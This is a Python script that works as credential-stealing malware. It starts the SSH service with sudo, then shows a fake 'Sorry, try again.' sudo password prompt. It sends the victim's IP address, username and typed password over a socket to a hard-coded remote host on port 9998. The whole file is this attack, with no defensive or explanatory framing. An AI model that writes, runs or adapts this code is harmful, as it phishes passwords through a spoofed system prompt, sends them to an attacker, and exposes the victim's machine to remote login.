import socket
import subprocess
from subprocess import PIPE
import getpass
import time

def getIP():
	try:
	    res1 = subprocess.check_output('ifconfig')
	except:
	    print("Error.")

	return res1.decode("utf-8").split("eth0:")[1].split("inet ")[1].split(" ")[0]

def getUSER():
	try:
	    res2 = subprocess.check_output('whoami')
	except:
	    print("Error.")

	return res2.decode("utf-8").strip()


def getPASS(USER):
	time.sleep(2)
	print("Sorry, try again.")
	PASS = getpass.getpass(prompt="password for " + USER + ": ")
	return PASS.strip()


def getIPandsendIP():
	#host's IP
	HOST = '192.168.127.130'
	PORT =9998
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client.connect((HOST, PORT))

	client.send(getIP().encode("utf-8"))
	response1 = client.recv(4096)
	

	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client.connect((HOST, PORT))
	client.send(getUSER().encode("utf-8"))
	response2 = client.recv(4096)
	
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client.connect((HOST, PORT))
	PASS=getPASS(getUSER())
	client.send(PASS.encode("utf-8"))
	response3 = client.recv(4096)

	client.close()

def buildSSH():
	res4 = subprocess.run(["sudo", "systemctl", "start", "ssh"], stdout=subprocess.PIPE)


def main():
    buildSSH()
    getIPandsendIP()


if __name__=="__main__":
    main()